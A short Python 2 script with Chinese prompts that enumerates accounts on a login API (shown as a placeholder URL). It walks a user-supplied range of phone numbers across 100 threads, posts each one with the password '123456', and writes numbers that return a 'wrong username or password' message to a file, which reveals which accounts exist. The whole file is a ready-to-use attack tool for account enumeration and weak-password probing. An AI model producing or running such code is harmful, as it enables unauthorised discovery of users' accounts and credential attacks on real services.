# coding=UTF-8
import requests
import json
import threading
import Queue

def runs():
	numberA = int(raw_input("输入开始的号码:".decode('utf8')))
	numberB = int(raw_input("输入结束的号码:".decode('utf8')))
	#numberB = int('13076257999')
	myqueue = Queue.Queue()
	for phone in range(numberA,numberB):
		try:
			myqueue.put(phone)
		except:
			print "error"
	return myqueue

def test(myqueue):
	while not myqueue.empty():
		phone = myqueue.get()
		postnumber(phone)

def postnumber(phone):
	url = 'https://www.exp.com/xxx/xxx/login'						#login api
	number_phone = phone
	post_data = 'dialCode=86&loginno='+str(number_phone)+'&password=123456'			#login api
	headers = {'user-agent':'Mozilla/5.0 (Linux; Android 4.4.2; HUAWEI G730-U00 Build/HuaweiG730-U00) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/30.0.0.0 Mobile Safari/537.36','Content-Type':'application/x-www-form-urlencoded; charset=UTF-8'}
	r = requests.post(url,data=post_data,headers=headers)
	statusq = (r.text)
	bus = json.dumps(statusq,sort_keys=True,indent=4)
	number_status =  r.json()['msg']
	print number_status.decode('gbk')+':'+ str(number_phone)
	#print number_status == '用户名或密码错误'.decode('utf8')				#判断方法也需要根据实际情况修改
	if number_status == '用户名或密码错误'.decode('utf8'):
		with open("numbers.txt",'a+') as f:
			f.write(str(number_phone)+'\n')
			print number_phone
	else:
		return None


#t1 = threading.Thread(target=runs,args=())
#threads.append(t1)
#t2 = threading.Thread(target=postnumber,args=())
#threads.append(t2)


if __name__=='__main__':
	threads = []
	tnum = 100
	myqueue = runs()
	for i in range(0,tnum):
		t = threading.Thread(target=test,args=([myqueue]))
		t.setDaemon(True)
		t.start()
		threads.append(t)
	for t in threads:
		t.join()
	print "action"
